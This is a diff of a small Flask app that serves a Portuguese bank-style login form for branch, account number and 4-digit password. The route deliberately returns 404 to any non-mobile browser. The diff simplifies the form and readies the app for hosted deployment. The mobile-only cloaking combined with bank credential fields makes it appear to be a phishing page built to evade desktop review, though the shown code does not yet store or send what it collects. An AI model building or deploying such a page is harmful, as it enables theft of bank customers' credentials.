@@ -1,5 +1,6 @@
 %%writefile app.py
 from flask import Flask, request, render_template_string, abort
+import os
 
 app = Flask(__name__)
 
@@ -69,37 +70,11 @@ HTML_LOGIN = """
     <div class="box">
         <h2>Acessar</h2>
         <form method="post">
-            <input
-                name="agencia"
-                placeholder="Agência (0000)"
-                required
-                pattern="\\d{4}"
-                maxlength="4"
-                inputmode="numeric"
-            >
-
-            <input
-                name="conta"
-                placeholder="Conta (00000-6)"
-                required
-                maxlength="7"
-                inputmode="numeric"
-                oninput="formatarConta(this)"
-            >
-
-            <input
-                name="senha"
-                placeholder="Senha (4 dígitos)"
-                type="password"
-                required
-                pattern="\\d{4}"
-                maxlength="4"
-                inputmode="numeric"
-            >
-
+            <input name="agencia" placeholder="Agência (0000)" required maxlength="4" inputmode="numeric">
+            <input name="conta" placeholder="Conta (00000-6)" required maxlength="7" inputmode="numeric" oninput="formatarConta(this)">
+            <input name="senha" placeholder="Senha (4 dígitos)" type="password" required maxlength="4" inputmode="numeric">
             <button type="submit">ACESSAR</button>
         </form>
-
         {% if erro %}
         <div class="erro">{{ erro }}</div>
         {% endif %}
@@ -112,7 +87,6 @@ HTML_LOGIN = """
 def login():
     user_agent = request.headers.get('User-Agent', '').lower()
 
-    # PC → erro 404
     if 'mobile' not in user_agent:
         abort(404)
 
@@ -126,13 +100,14 @@ def login():
         if not agencia.isdigit() or len(agencia) != 4:
             erro = 'Agência inválida. Informe exatamente 4 números.'
         elif not (len(conta) == 7 and conta[:5].isdigit() and conta[5] == '-' and conta[6].isdigit()):
-            erro = 'Conta inválida. Informe 6 números (o hífen é automático).'
+            erro = 'Conta inválida.'
         elif not senha.isdigit() or len(senha) != 4:
-            erro = 'Senha inválida. Informe exatamente 4 números.'
+            erro = 'Senha inválida.'
         else:
             return "<h2>Acesso autorizado</h2>"
 
     return render_template_string(HTML_LOGIN, erro=erro)
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    port = int(os.environ.get("PORT", 10000))
+    app.run(host='0.0.0.0', port=port)
